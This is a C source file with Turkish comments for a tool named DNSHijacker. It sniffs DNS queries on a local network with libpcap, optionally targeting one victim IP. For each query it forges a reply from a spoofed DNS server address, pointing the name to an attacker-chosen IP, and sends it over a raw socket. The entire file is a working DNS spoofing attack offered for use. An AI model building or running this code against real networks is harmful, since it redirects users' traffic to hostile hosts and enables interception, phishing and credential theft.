/*
 *Macof.c (dsniff library)'den esinlenerek Oguz Han Ayaz Tarafindan Yazilmistir.
 *
 *Copyright (c) 1999 Dug Song <dugsong@monkey.org>"
 */

#include <pcap.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include "header.h"
#include "dns.h"
#define MAX_NAME_SIZE 200   //String boyutu
#define IP_MAX_SIZE 16      //String bicimindeki IP adresinin boyutu
#define RR_CLASSIC_SIZE 16 //Name format sikistirilmali DNS RR'nin (resource records) boyutu
#define TTL 300000      //DNS yanitlarimiza ayarlanmis TTL
#define PROT_UDP 17    //IP protokol numarasi
//Baglanti katmani header turleri
#define LINKTYPE_NULL 0     
#define LINKTYPE_ETH 1
#define LINKTYPE_WIFI 127

void process_packet(u_char *args, const struct pcap_pkthdr *header, const u_char *buffer);
char ipanswered[IP_MAX_SIZE];   //DNS isteklerine yanit olarak gönderdigimiz IP adresi
int header_type = 0;     //Katman header turunu Pcap tablosuna göre bagla => bknz http://www.tcpdump.org/linktypes.html
int num_packs = 0;       //Yakalanan paket sayisi

static void usage(void){
  printf("DNSHijacker [<IP addr answered> [<Hedef IP Adresi>]]\n");
  exit(1);
}

int main (int argc, char **argv){

	int ipfiltered = 0;               
	char iptofilter[IP_MAX_SIZE];     //Kurban'a ait IP Adresi

	if(argc >= 2 && strstr(argv[1],(char *) "help") != 0){
		usage();
		exit(0);
	}

	//Arguments aliniyor.
	if (argc >= 2) {
		strncpy(ipanswered, argv[1], IP_MAX_SIZE);
		if (argc >= 3){
			ipfiltered = 1;
			strncpy(iptofilter,argv[2],IP_MAX_SIZE);
		}
	} else {
		strncpy(ipanswered,"79.123.223.60",15);   //Varsayilan Yanit IP adresi-DuzceUniversitesi
	}

	/****** SNIFFING BOLUMU : Pcap ortamini ayarlama **********/
	pcap_t *handle;
	pcap_if_t *all_dev, *dev;
	char err_buf[PCAP_ERRBUF_SIZE], dev_list[30][2];
	char *dev_name;
	//Kullanilabilir tum cihazlari listeleme_Baslangic
	if(pcap_findalldevs(&all_dev, err_buf))
	{
		fprintf(stderr, "Cihaz bulunamadý: %s", err_buf);
		exit(1);
	}
	if(all_dev == NULL)
	{
		fprintf(stderr, "Aygit bulunamadi. Lutfen root ile calistiginizi kontrol edin \n");
		exit(1);
	}
	printf("Kullanilabilir cihazlar listesi: \n");
	int c = 1;
	for(dev = all_dev; dev != NULL; dev = dev->next)
	{
		printf("#%d %s : %s \n", c, dev->name, dev->description);
		if(dev->name != NULL)
		{
			strncpy(dev_list[c], dev->name, strlen(dev->name));
		}
		c++;
	}
	printf("Lutfen izleme cihazini secin (orn eth0):\n");
	dev_name = malloc(20);
	fgets(dev_name, 20, stdin);
	*(dev_name + strlen(dev_name) - 1) = '\0'; //Siliniyor '\n'
	//Kullanilabilir tum cihazlari listeleme_SON

	//Pcap ile islev olusturma
	if (!(handle = pcap_create(dev_name, err_buf))){
		fprintf(stderr, "Pcap olusturma hatasi : %s", err_buf);
		exit(1);
	}
	
	//Cihaz monitor modunda (WiFi) ayarlanabilirse, ayarlari yapariz. Aksi takdirde, karisik mod ayarlanir
	if (pcap_can_set_rfmon(handle)==1){
		if (pcap_set_rfmon(handle, 1))
			pcap_perror(handle,"Monitor mod ayarlanirken hata olustu");
	} else {
		if(pcap_set_promisc(handle,1))
			pcap_perror(handle,"Karisik mod ayarlanirken hata olustu");
	}

	//Paketlerin islenmesi icin zaman asimi suresini 1 ms olarak ayarlama
	if (pcap_set_timeout(handle, 1))
		pcap_perror(handle,"Pcap zaman asimi ayarlama hatasi");

	//Sniff islevini etkinlestirme
	if (pcap_activate(handle))
		pcap_perror(handle,"Pcap etkinlestirme hatasi");

	//PCAP tablosuna göre LINK katmani header turu: bkz. Http://www.tcpdump.org/linktypes.html
	header_type = pcap_datalink(handle);

	/**** Yalnizca DNS sorgularini yakalamak icin filtre ayarlama *********/
	struct bpf_program *prog = malloc(sizeof(struct bpf_program));
	if (ipfiltered){
		char string[100];
		strcpy(string,"src host ");
		strcat(string,iptofilter);
		strcat(string," and udp dst port 53");
		if(pcap_compile(handle,prog,string,0,PCAP_NETMASK_UNKNOWN)<0)
			pcap_perror(handle,"Handle derleme hatasi");
	} else {
		if(pcap_compile(handle,prog,"udp dst port 53",0,PCAP_NETMASK_UNKNOWN)<0)
			pcap_perror(handle,"Handle derleme hatasi");
	}
	if(pcap_setfilter(handle,prog)<0)
		pcap_perror(handle,"Handle filtre ayarlama hatasi");

	/****** yakalanan paketleri yazmak için gunluk(log) dosyasý ******/
	logfile=fopen("log.txt","w");
	if(logfile==NULL)
	{
		perror("Dosya olusturulamiyor");
		exit(1);
	}

	/******* Yakalamayi baslatma ***********/
	pcap_loop(handle , -1 , process_packet , NULL);
	

	pcap_close(handle);
	fclose(logfile);
	return 0;
}


/***************************************
Bu fonksiyonda yakalama paketleyicisini ele aliyoruz. 
Bir DNS istegi olup olmadigini kontrol etmesini ve cevaplamasini istiyoruz (pcap filtresinin calismasi gerekiyorsa da).

**************************************/
void process_packet(u_char *args, const struct pcap_pkthdr *header, const u_char *buffer){
	int size = header->len;
	num_packs++;
	printf("\n\nPaket snifflendi : %d\n", num_packs);

	//IP Header baslangicini bulma
	struct iphdr *iph;
	if (header_type == LINKTYPE_ETH)
		iph = (struct iphdr*)(buffer + sizeof(struct ethhdr)); //Ethernet icin
	else if (header_type == LINKTYPE_NULL)
		iph = (struct iphdr*)(buffer + 4);
	else if (header_type == LINKTYPE_WIFI)
		iph = (struct iphdr*)(buffer + 57);
	else{
		fprintf(stderr, "Bilinmeyen header turu %d\n", header_type);
		exit(1);
	}

	/********** Paketin özelliklerini kontrol etme ve ekrana ve log dosyasina yazma **********************/
	fputs("\n\n\n#########################################\n", logfile);
	fputs ("                 Gelen Paket             \n", logfile);
	print_ip_packet((u_char*)iph);
	//Bir UDP paketimizin olup olmadigini kontrol etme (normalde yalnizca DNS sorgu paketleri filtrelenmis olsa da)
	if (iph->protocol != PROT_UDP){
		printf("Protokol: %d\n", iph->protocol);
		return;
	}
	struct udphdr *udph = (struct udphdr*)(iph + 1); 
	print_udp_packet((u_char*)udph);
	//Bir DNS sorgu paketi olup olmadigini kontrol edin
	if (udph->dest != htons(53)){
		printf("UDP hedef baglanti noktasi: %d\n", udph->dest);
		return;
	}
	//Bir DNS sorgu paketini sniffledik
	printf("It is a DNS packet\n");
	PrintData(buffer,size);
	dns_header *dnsh = (dns_header*) (udph+1);
	uint8_t *ptr8 = (uint8_t*) dnsh + sizeof(dns_header);
	//DNS Headerinden sonra ilk sorguyu bulma
	char hostnamedns[MAX_NAME_SIZE];
	char hostnamenormal[MAX_NAME_SIZE];
	strncpy(hostnamedns, (char*)ptr8, MAX_NAME_SIZE);
	get_domain_name(hostnamenormal, hostnamedns);
	printf("Sorgu HostName icin snifflendi %s\n", hostnamenormal);


	/*************** Cevap yaziliyor *********************/
	uint8_t *ansbuf = malloc(size + RR_CLASSIC_SIZE); //Cevabýmýz bu boyutu asmamalidir.
													  //sadece bir cevap ekliyoruz
	bzero(ansbuf, size + RR_CLASSIC_SIZE);
	uint8_t *dnsans = ansbuf + sizeof(struct iphdr)+sizeof(struct udphdr);
	//Magdurun DNS Headerini kopyalariz
	memcpy(dnsans, dnsh, sizeof(dns_header));
	((dns_header*)dnsans)->flags = htons(1 << 15);  //QR Flag alanini 1 olarak ayarlama
	((dns_header*)dnsans)->an_count = htons(1);   //Yanit sayisini 1 olarak ayarlama
	memcpy(dnsans+sizeof(dns_header), ptr8, strlen(hostnamedns)+1+4); //Ilk alicinin sorgusunu kopyalariz
	uint16_t *ptr16;
	/********* DNS_RR - Cevap Yaziliyor ************/
	ptr16 = (uint16_t*) (dnsans + sizeof(dns_header)+strlen(hostnamedns)+1+4);
	ptr8 = (uint8_t*) ptr16;
	//Name Format Sikistirmasi Yaziliyor
	*ptr16 = htons(sizeof(dns_header));
	*ptr8 += 0b11000000;
	ptr16++;
	//Turu ve Sinifi Yaziliyor
	*ptr16 = htons(TYPE_A);
	ptr16++;
	*ptr16 = htons(CLASS_IN);
	ptr16++;
	//TTL Ayarlaniyor
	uint32_t *ptr32;
	ptr32 = (uint32_t*) ptr16; 
	*ptr32 = htonl(TTL);
	ptr16 += 2;
	//RDLENGTH Ayarlaniyor
	*ptr16 = htons(4);  
	ptr16++;
	//RDATA Ayarlaniyor
	inet_pton(AF_INET, ipanswered, (struct in_addr*) ptr16);
	
	/******* UDP headeri Yaziliyor **************/
	struct udphdr *udpans = (struct udphdr*) (ansbuf + sizeof(struct iphdr));
	udpans->source = htons(53);
	udpans->dest = udph->source;
	udpans->len = htons(ntohs(udph->len) + RR_CLASSIC_SIZE);
	udpans->check = 0;

	/****** Sahte kaynak adresiyle IP Headeri(Basligi) yaziliyor ***********/
	struct iphdr *ipans = (struct iphdr*) ansbuf;
	ipans->version = 4;
	ipans->ihl = 5;
	ipans->tot_len = (size+RR_CLASSIC_SIZE);  //Burada htons() kullanmiyoruz cunku OSX BSD tabanli kernel yapisindan kaynakli !!!
	ipans->id = iph->id;
	ipans->ttl = 12;
	ipans->protocol = PROT_UDP;
	ipans->saddr = iph->daddr;     //Ýste sahte IP kaynak adresi
	ipans->daddr = iph->saddr;
	ipans->check = 0;

	/******** Raw socket olusturma ***********/
	int fd = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
	int hincl = 1;
	setsockopt(fd, IPPROTO_IP, IP_HDRINCL, &hincl, sizeof(hincl));
	if(fd < 0)
	{
		perror("Raw socket olusturma hatasi");
		exit(1);
	}
	struct sockaddr_in client;
	bzero(&client, sizeof(struct sockaddr_in));
	client.sin_family = AF_INET;
	client.sin_port = udph->source;
	client.sin_addr.s_addr = iph->saddr;

	/********** Paket Gonderiliyor *******************/
	printf("Paket Gonderildi : \n");
	fputs("\n\n\n#########################################\n", logfile);
	fputs("             PAKET GONDERILDI                  \n", logfile);
	PrintData(ansbuf, size+RR_CLASSIC_SIZE);
	fputs("\n\n\n#########################################\n\n\n", logfile);
	fflush(logfile); //Sistemin IO arabellegini dosyaya temizleme
	int lensent = sendto(fd, ansbuf, size+RR_CLASSIC_SIZE,
		0, (struct sockaddr*) &client, sizeof(struct sockaddr_in));
	if (lensent <= 0)
		perror("Gonderim Hatasi");
	else
		fprintf(stderr, "%d Bytelar eksiksiz gonderildi \n", lensent);

	/********* SON **********************/

}
